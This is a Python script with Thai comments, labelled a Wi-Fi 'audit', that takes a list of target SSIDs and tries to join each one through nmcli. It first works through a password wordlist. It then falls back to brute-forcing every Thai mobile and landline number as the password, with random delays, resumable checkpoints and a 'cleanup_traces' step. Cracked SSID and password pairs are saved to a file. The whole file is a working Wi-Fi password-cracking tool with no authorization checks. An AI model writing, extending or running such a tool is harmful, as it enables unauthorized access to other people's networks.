#!/usr/bin/env python3

import asyncio
import json
import os
import random
import signal
import sys
import time
from pathlib import Path


WIFI_FILE = Path("wifi.txt")
PASSWORD_FILE = Path("password.txt")
OUTPUT_FILE = Path("wifi_out.txt")
CHECKPOINT_FILE = Path(".wifi-audit-checkpoint.json")

INTERFACE = "wlan1"
CHECKPOINT_EVERY = 500

# หน่วงเวลาระหว่างการลองแต่ละครั้ง (หน่วยวินาที)
# เพิ่มขึ้นเพื่อไม่ให้ CPU/RAM ของ Pi5 ค้าง
DELAY_MIN = 0.15
DELAY_MAX = 0.35

# จำนวน worker สูงสุด (ไม่ parallel จริง แต่ใช้จำกัด queue)
MAX_CONCURRENT = 1

MOBILE_PREFIXES = ["06", "08", "09"]
ENABLE_MAC_SPOOFING = False

# จำกัดเวลา timeout ของ nmcli
CONNECT_TIMEOUT = 8.0
CHECK_TIMEOUT = 2.0
CLEANUP_TIMEOUT = 2.0


# ============================================================
# SILENT BACKGROUND EXECUTOR
# ============================================================

silent_env = os.environ.copy()
silent_env["LC_ALL"] = "C"
silent_env["DISPLAY"] = ""
silent_env["WAYLAND_DISPLAY"] = ""
silent_env["NO_AT_BRIDGE"] = "1"


async def run_command_async(args, timeout=3.0):
    """รันคำสั่งแบบ async พร้อม timeout และ kill process ให้แน่นอน"""
    process = None
    try:
        process = await asyncio.create_subprocess_exec(
            *args,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            env=silent_env,
        )
        try:
            stdout, stderr = await asyncio.wait_for(
                process.communicate(), timeout=timeout
            )
        except asyncio.TimeoutError:
            # kill process group เพื่อไม่ให้ค้าง
            try:
                process.kill()
            except ProcessLookupError:
                pass
            try:
                await asyncio.wait_for(process.wait(), timeout=2.0)
            except Exception:
                pass
            return -1, "", "Timeout"
        return (
            process.returncode,
            stdout.decode(errors="replace"),
            stderr.decode(errors="replace"),
        )
    except Exception as e:
        if process is not None:
            try:
                process.kill()
            except ProcessLookupError:
                pass
            try:
                await asyncio.wait_for(process.wait(), timeout=2.0)
            except Exception:
                pass
        return -1, "", str(e)


async def optimize_wifi_interface():
    await run_command_async(
        ["sudo", "iw", "dev", INTERFACE, "set", "power_save", "off"], timeout=2
    )


async def cleanup_traces(ssid):
    """ลบ connection ที่ค้างอยู่ และ disconnect interface"""
    await run_command_async(
        ["sudo", "nmcli", "connection", "delete", ssid], timeout=CLEANUP_TIMEOUT
    )
    await run_command_async(
        ["sudo", "nmcli", "device", "disconnect", INTERFACE], timeout=CLEANUP_TIMEOUT
    )
    # หน่วงเล็กน้อยให้ nmcli เคลียร์ state
    await asyncio.sleep(0.1)


async def check_candidate_silent(ssid, candidate):
    """
    ลองเชื่อมต่อ Wi-Fi ด้วยรหัสที่กำหนด
    คืนค่า True ถ้าเชื่อมต่อสำเร็จ
    """
    await asyncio.sleep(random.uniform(DELAY_MIN, DELAY_MAX))

    code, stdout, stderr = await run_command_async(
        [
            "sudo",
            "nmcli",
            "device",
            "wifi",
            "connect",
            ssid,
            "password",
            candidate,
            "ifname",
            INTERFACE,
        ],
        timeout=CONNECT_TIMEOUT,
    )

    is_connected = False
    if code == 0:
        ret, out, _ = await run_command_async(
            ["nmcli", "-t", "-f", "GENERAL.STATE", "device", "show", INTERFACE],
            timeout=CHECK_TIMEOUT,
        )
        if ret == 0 and "100 (connected)" in out:
            is_connected = True

    await cleanup_traces(ssid)
    return is_connected


# ============================================================
# LOGICAL PHONE NUMBER GENERATOR
# ============================================================

def structured_phone_generator(start_index=0):
    """
    สร้างเบอร์โทรศัพท์แบบ generator
    start_index ใช้สำหรับ resume
    """
    current = 0
    for prefix in MOBILE_PREFIXES:
        for i in range(100_000_000):
            if current >= start_index:
                yield f"{prefix}{i:08d}"
            current += 1

    for i in range(10_000_000):
        if current >= start_index:
            yield f"02{i:07d}"
        current += 1


# ============================================================
# CHECKPOINT MANAGEMENT
# ============================================================

def save_checkpoint(ssid_index, ssid, line_number, mode="password", phone_index=0):
    data = {
        "ssid_index": ssid_index,
        "ssid": ssid,
        "line": line_number,
        "mode": mode,
        "phone_index": phone_index,
    }
    temp_file = Path(str(CHECKPOINT_FILE) + ".tmp")
    try:
        temp_file.write_text(
            json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8"
        )
        temp_file.replace(CHECKPOINT_FILE)
    except Exception:
        pass


def load_checkpoint():
    if not CHECKPOINT_FILE.exists():
        return None
    try:
        return json.loads(CHECKPOINT_FILE.read_text(encoding="utf-8"))
    except Exception:
        return None


def clear_checkpoint():
    try:
        CHECKPOINT_FILE.unlink(missing_ok=True)
    except Exception:
        pass


def save_successful_result(ssid, password):
    """
    บันทึกผลลัพธ์ลงไฟล์ wifi_out.txt (ถ้าไม่มีให้สร้าง)
    """
    try:
        with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
            f.write(f"SSID: {ssid} | Password: {password}\n")
            f.flush()
            os.fsync(f.fileno())
    except Exception as e:
        print(f"\n[ข้อผิดพลาดในการบันทึกไฟล์ผลลัพธ์]: {e}", flush=True)


# ============================================================
# AUDIT ENGINE
# ============================================================

async def audit_wifi(
    ssid, ssid_index, total, start_line=0, start_mode="password", start_phone_index=0
):
    print(
        f"\n[{ssid_index + 1}/{total}] กำลังตรวจสอบ SSID: {ssid} บน Interface: {INTERFACE}",
        flush=True,
    )

    await optimize_wifi_interface()
    await cleanup_traces(ssid)

    checked = 0
    started_at = time.monotonic()
    line_number = 0

    # 1. ตรวจสอบรหัสผ่านจากไฟล์ password.txt ก่อน
    if start_mode == "password" and PASSWORD_FILE.exists():
        with open(PASSWORD_FILE, "r", encoding="utf-8-sig", errors="replace") as f:
            for line in f:
                line_number += 1
                if line_number <= start_line:
                    continue

                candidate = line.rstrip("\r\n")
                if not candidate:
                    continue

                checked += 1

                elapsed = time.monotonic() - started_at
                rate = (checked / elapsed) if elapsed > 0 else 0
                status_line = (
                    f"[{ssid}] ตรวจสอบแล้ว: {checked:,} | "
                    f"กำลังลองรหัส: {candidate:<20} | "
                    f"ความเร็ว: {rate:,.2f} รหัส/วินาที"
                )
                sys.stdout.write(f"\r{status_line}\033[K")
                sys.stdout.flush()

                success = await check_candidate_silent(ssid, candidate)

                if success:
                    sys.stdout.write("\033[K")
                    print(
                        f"\n[พบรหัสผ่านถูกต้อง] SSID: {ssid} | รหัสผ่าน: {candidate} | บรรทัดที่: {line_number:,}",
                        flush=True,
                    )
                    save_successful_result(ssid, candidate)
                    return {
                        "ssid": ssid,
                        "success": True,
                        "password": candidate,
                        "password_line": line_number,
                        "checked": checked,
                    }

                if checked % CHECKPOINT_EVERY == 0:
                    save_checkpoint(
                        ssid_index, ssid, line_number, mode="password", phone_index=0
                    )

    # 2. หากรหัสผ่านในไฟล์หมดแล้ว และยังไม่เจอ ให้สลับไปโหมดสร้างเบอร์โทรศัพท์ต่อทันที
    print(
        f"\n[{ssid}] สิ้นสุดไฟล์รหัสผ่าน -> เปลี่ยนไปยังระบบสร้างเบอร์โทรศัพท์...",
        flush=True,
    )
    phone_gen = structured_phone_generator(start_phone_index)

    for p_idx, candidate in enumerate(phone_gen):
        actual_idx = start_phone_index + p_idx
        checked += 1

        elapsed = time.monotonic() - started_at
        rate = (checked / elapsed) if elapsed > 0 else 0
        status_line = (
            f"[{ssid}-Phone] ตรวจสอบแล้ว: {checked:,} | "
            f"กำลังลองเบอร์: {candidate:<15} | "
            f"ความเร็ว: {rate:,.2f} เบอร์/วินาที"
        )
        sys.stdout.write(f"\r{status_line}\033[K")
        sys.stdout.flush()

        success = await check_candidate_silent(ssid, candidate)

        if success:
            sys.stdout.write("\033[K")
            print(
                f"\n[พบเบอร์โทรศัพท์ที่ถูกต้อง] SSID: {ssid} | เบอร์โทร: {candidate}",
                flush=True,
            )
            save_successful_result(ssid, candidate)
            return {
                "ssid": ssid,
                "success": True,
                "password": candidate,
                "password_line": actual_idx,
                "checked": checked,
            }

        if checked % CHECKPOINT_EVERY == 0:
            save_checkpoint(
                ssid_index, ssid, line_number=0, mode="phone", phone_index=actual_idx
            )

    return {
        "ssid": ssid,
        "success": False,
        "password": None,
        "checked": checked,
    }


# ============================================================
# MAIN
# ============================================================

async def main_async():
    if not WIFI_FILE.exists() or not PASSWORD_FILE.exists():
        sys.exit("ข้อผิดพลาด: ไม่พบไฟล์ wifi.txt หรือ password.txt")

    targets = [
        line.strip()
        for line in WIFI_FILE.open("r", encoding="utf-8-sig")
        if line.strip()
    ]
    checkpoint = load_checkpoint()

    start_ssid_index = 0
    resume_line = 0
    resume_mode = "password"
    resume_phone_index = 0

    if checkpoint:
        try:
            start_ssid_index = int(checkpoint.get("ssid_index", 0))
            resume_line = int(checkpoint.get("line", 0))
            resume_mode = checkpoint.get("mode", "password")
            resume_phone_index = int(checkpoint.get("phone_index", 0))
        except (ValueError, TypeError):
            pass

    successful_results = []

    try:
        for index, ssid in enumerate(targets):
            if index < start_ssid_index:
                continue

            line = (
                resume_line
                if (index == start_ssid_index and resume_mode == "password")
                else 0
            )
            mode = resume_mode if index == start_ssid_index else "password"
            phone_idx = (
                resume_phone_index
                if (index == start_ssid_index and resume_mode == "phone")
                else 0
            )

            result = await audit_wifi(
                ssid,
                index,
                len(targets),
                start_line=line,
                start_mode=mode,
                start_phone_index=phone_idx,
            )

            if result and result.get("success"):
                successful_results.append(result)
                # เมื่อเจอพาสเวิร์ด/เบอร์ที่ถูกต้องแล้ว ให้ข้ามไปทำ SSID ถัดไปทันที
                # (return จาก audit_wifi แล้ว จึงไปตัวถัดไปใน loop)

            save_checkpoint(index + 1, "", 0, mode="password", phone_index=0)
            resume_line = 0
            resume_mode = "password"
            resume_phone_index = 0

        clear_checkpoint()

    except (KeyboardInterrupt, asyncio.CancelledError):
        print(
            "\nผู้ใช้ยกเลิกกระบวนการ บันทึกจุดตรวจสอบ (Checkpoint) เรียบร้อยแล้ว",
            flush=True,
        )
        return 130

    print("\nกระบวนการตรวจสอบเสร็จสิ้นสมบูรณ์", flush=True)

    print("\n" + "=" * 65)
    print(" 🎉 สรุปผลการตรวจสอบ Wi-Fi ที่เชื่อมต่อสำเร็จ (SUCCESS SUMMARY) 🎉")
    print("=" * 65)
    if successful_results:
        for idx, res in enumerate(successful_results, 1):
            print(f" {idx}. SSID: {res['ssid']}  -->  รหัสผ่าน/เบอร์: {res['password']}")
        print(f"\n* บันทึกข้อมูลผลลัพธ์ลงในไฟล์ '{OUTPUT_FILE}' เรียบร้อยแล้ว *")
    else:
        print(" ไม่พบเครือข่าย Wi-Fi ที่สามารถเชื่อมต่อสำเร็จในรอบนี้")
    print("=" * 65)

    return 0


def main():
    try:
        return asyncio.run(main_async())
    except KeyboardInterrupt:
        print("\n interrupted", flush=True)
        return 130


if __name__ == "__main__":
    sys.exit(main())